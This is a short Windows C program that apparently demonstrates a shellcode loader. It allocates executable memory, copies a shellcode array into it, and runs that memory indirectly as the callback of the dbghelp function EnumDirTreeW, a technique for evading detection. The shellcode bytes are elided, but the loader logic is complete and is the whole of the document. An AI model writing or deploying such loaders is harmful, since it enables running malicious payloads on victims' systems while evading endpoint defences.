#include <windows.h>
#include <stdio.h>
#include <dbghelp.h>

extern BOOL IMAGEAPI EnumDirTreeW(HANDLE hProcess, PCWSTR RootPath, PCWSTR InputPathName, PWSTR OutputPathBuffer, LPVOID cb, PVOID data);

unsigned char shellcode[] = ...

int main() {


    LPVOID address = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(address, &shellcode[0], sizeof(shellcode));

    SymInitialize(GetCurrentProcess(), NULL, TRUE);

    WCHAR dummy[522];
    EnumDirTreeW(GetCurrentProcess(), L"C:\\Windows", L"*.log", dummy, address, NULL);
}